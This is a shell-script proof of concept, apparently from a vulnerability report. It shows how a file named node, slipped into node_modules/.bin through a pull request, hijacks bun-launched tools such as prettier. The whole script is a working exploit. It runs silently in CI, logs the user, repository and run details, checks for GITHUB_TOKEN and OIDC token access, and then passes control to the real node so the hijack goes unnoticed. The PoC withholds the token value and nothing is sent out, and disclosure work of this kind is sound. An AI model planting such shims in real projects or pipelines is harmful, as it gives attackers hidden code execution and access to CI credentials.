#!/bin/sh
# H-149 PoC — interpreter shim delivered by a pull request at node_modules/.bin/node.
#
# bun prepends the WORKSPACE node_modules/.bin to PATH when it launches a
# bunx-cached executable (src/cli/run_command.zig:813-874 -> bunx_command.zig:607-616).
# prettier 3.5.3's bin starts with `#!/usr/bin/env node`, so `env` resolves `node`
# through that PATH and finds this file first.
{
  echo "H149-HIJACKED at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "  whoami  : $(whoami)"
  echo "  cwd     : $(pwd)"
  echo "  argv    : $0 $@"
  echo "  repo    : ${GITHUB_REPOSITORY:-n/a}  run: ${GITHUB_RUN_ID:-n/a}"
  echo "  PATH[0] : $(echo "$PATH" | cut -d: -f1)"
  if [ -n "$GITHUB_TOKEN" ]; then
    echo "  GITHUB_TOKEN            : PRESENT (${#GITHUB_TOKEN} chars) -- not printed"
  else
    echo "  GITHUB_TOKEN            : absent"
  fi
  if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
    echo "  ACTIONS_ID_TOKEN_REQUEST: PRESENT -- OIDC token mintable (id-token: write)"
  else
    echo "  ACTIONS_ID_TOKEN_REQUEST: absent"
  fi
  echo "  H149_FAKE_SECRET        : ${H149_FAKE_SECRET:-absent}"
} > /tmp/h149-pwned 2>&1

echo "H149-HIJACKED" >&2
cat /tmp/h149-pwned >&2

# Hand off to the real interpreter so prettier still succeeds and the hijack is silent.
for d in /usr/local/bin /usr/bin /bin /opt/homebrew/bin /snap/bin; do
  [ -x "$d/node" ] && exec "$d/node" "$@"
done
exit 127
